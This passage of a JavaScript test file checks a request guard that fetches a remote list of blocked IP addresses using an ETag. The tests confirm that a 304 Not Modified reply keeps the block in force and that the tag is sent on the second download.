  assert.equal((await guard({ mode: 'enforce' }).decide('signup', {})).checked, false, 'without a key there is nobody to ask')
})

test('the list of blocked addresses is asked for with its tag, and an unchanged list (304) costs nothing and keeps working', async () => {
  const seen = []
  let t = 1_000_000
  const fetch = async (url, init = {}) => {
    seen.push(init.headers?.['if-none-match'] || null)
    if (init.headers?.['if-none-match'] === '"v1"') return { ok: false, status: 304 }
    return { ok: true, status: 200, headers: { get: (h) => (h === 'etag' ? '"v1"' : null) }, json: async () => ({ mode: 'strict', decisions: [{ ip: '198.51.100.9', action: 'block', expires_at: new Date(Date.now() + 600000).toISOString() }] }) }
  }
  const g = createGuard({ secret: 'bsec_x', trustProxy: 1, mode: 'enforce', fetch, report: { enabled: false }, now: () => t, remote: { blocking: true } })
  assert.equal((await g.check(req('/', { ip: '198.51.100.9' }))).status, 403)
  t += 31_000
  assert.equal((await g.check(req('/', { ip: '198.51.100.9' }))).status, 403, 'still blocked after a 304')
  await new Promise((r) => setTimeout(r, 10))
  assert.deepEqual(seen, [null, '"v1"'], 'the second download carried the tag')
})
